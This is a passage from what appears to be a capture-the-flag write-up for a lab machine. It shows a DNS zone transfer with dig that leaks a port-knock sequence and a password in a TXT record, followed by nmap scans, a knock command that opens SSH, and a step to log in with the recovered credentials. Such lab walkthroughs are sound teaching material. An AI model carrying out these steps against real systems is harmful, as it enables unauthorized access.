# DNS

```bash
$ dig axfr @10.10.10.83 ctfolympus.htb

; <<>> DiG 9.16.15-Debian <<>> axfr @10.10.10.83 ctfolympus.htb
; (1 server found)
;; global options: +cmd
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.		86400	IN	TXT	"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.		86400	IN	A	192.168.0.120
ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.
ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.
ctfolympus.htb.		86400	IN	MX	10 mail.ctfolympus.htb.
crete.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
hades.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
mail.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120
ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120
rhodes.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN	TXT	"Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.
ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 35 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Mon May 17 20:29:30 CDT 2021
;; XFR size: 15 records (messages 1, bytes 475)
```

We have a bunch of domain name.

```bash
ns1.ctfolympus.htb
ns2.ctfolympus.htb
mail.ctfolympus.htb
hades.ctfolympus.htb
crete.ctfolympus.htb
rhodes.ctfolympus.htb
RhodesColossus.ctfolympus.htb
ctfolympus.htb
```

And potential credentials : `prometheus:St34l_th3_F1re!`

We can knock these ports.

```bash
$ nmap 10.10.10.83 -p 22
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 20:35 CDT
Nmap scan report for 10.10.10.83
Host is up (0.040s latency).

PORT   STATE    SERVICE
22/tcp filtered ssh

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

```bash
$ knock -v 10.10.10.83 3456 8234 62431
hitting tcp 10.10.10.83:3456
hitting tcp 10.10.10.83:8234
hitting tcp 10.10.10.83:62431
```

```bash
$ nmap 10.10.10.83 -p 22
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 20:36 CDT
Nmap scan report for 10.10.10.83
Host is up (0.036s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

Then, connect to ssh with the previous credentials.
